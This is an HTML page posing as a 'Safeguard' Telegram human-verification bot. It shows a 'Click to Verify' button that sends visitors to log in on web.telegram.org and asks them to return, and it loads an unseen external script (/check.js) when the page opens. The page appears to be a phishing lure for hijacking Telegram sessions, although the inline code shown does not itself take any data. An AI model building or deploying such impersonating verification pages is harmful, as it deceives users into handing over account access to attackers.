<!DOCTYPE html>
<html style="--tg-color-scheme: dark; --tg-theme-bg-color: #212121; --tg-theme-text-color: #ffffff; --tg-theme-hint-color: #aaaaaa; --tg-theme-link-color: #8774e1; --tg-theme-button-color: #8774e1; --tg-theme-button-text-color: #ffffff; --tg-theme-secondary-bg-color: #0f0f0f; --tg-theme-header-bg-color: #212121; --tg-theme-accent-text-color: #8774e1; --tg-theme-section-bg-color: #212121; --tg-theme-section-header-text-color: #aaaaaa; --tg-theme-subtitle-text-color: #aaaaaa; --tg-theme-destructive-text-color: #e53935; --tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>Safeguard</title>
    <meta name="description" content="@Safeguard Verification Bot">
    <link rel="icon" href="./favicon.ico">
    <meta name="next-head-count" content="5">
    <link rel="stylesheet" href="./_next/static/css/3db7e18ba6d2d9e9.css" data-n-g="">
    <style>
      /* Fallback font to avoid loading non-existent font files */
      body, button, p {
        font-family: monospace, sans-serif !important;
      }
    </style>
  </head>
  <body>
    <div id="__next">
      <div class="bg-telegram-bg">
        <main class="flex items-center justify-start flex-col gap-2 h-[100vh] p-4 text-center">
          <div class="mt-5">
            <p class="text-3xl font-bold text-telegram-text">Human Verification</p>
            <p class="text-md font-bold text-telegram-text mt-2">Verify below to be granted entry</p>
            <p class="text-md text-telegram-text mt-2">After logging in, please return to this app to continue verification.</p>
            <div class="flex items-center justify-center w-100 mt-3">
              <button onclick="openTelegramLogin(event)" class="w-full px-3 py-3 my-4 font-mono text-base rounded text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80">Click to Verify</button>
            </div>
          </div>
        </main>
      </div>
    </div>
    <script src="/check.js"></script>
    <script>
      function openTelegramLogin(event) {
        event.preventDefault(); // Prevent default button behavior (e.g., form submission)
        console.log("openTelegramLogin called");

        // Store the return URL in localStorage so we can redirect back after login
        localStorage.setItem('returnUrl', window.location.pathname + window.location.search);
        console.log("Stored returnUrl:", localStorage.getItem('returnUrl'));

        // Navigate directly to Telegram login
        const loginUrl = 'https://web.telegram.org/a/';
        console.log("Login URL:", loginUrl);

        if (window.Telegram && window.Telegram.WebApp) {
          console.log("Telegram.WebApp is available");
          try {
            window.Telegram.WebApp.ready(); // Ensure WebApp is ready
            console.log("Calling Telegram.WebApp.openLink with URL:", loginUrl);
            window.Telegram.WebApp.openLink(loginUrl);
          } catch (error) {
            console.error("Error calling Telegram.WebApp.openLink:", error);
            console.log("Falling back to window.location.href with URL:", loginUrl);
            window.location.href = loginUrl;
          }
        } else {
          console.error("Telegram.WebApp is not available");
          console.log("Navigating directly with window.location.href to URL:", loginUrl);
          window.location.href = loginUrl;
        }
      }
    </script>
  </body>
</html>
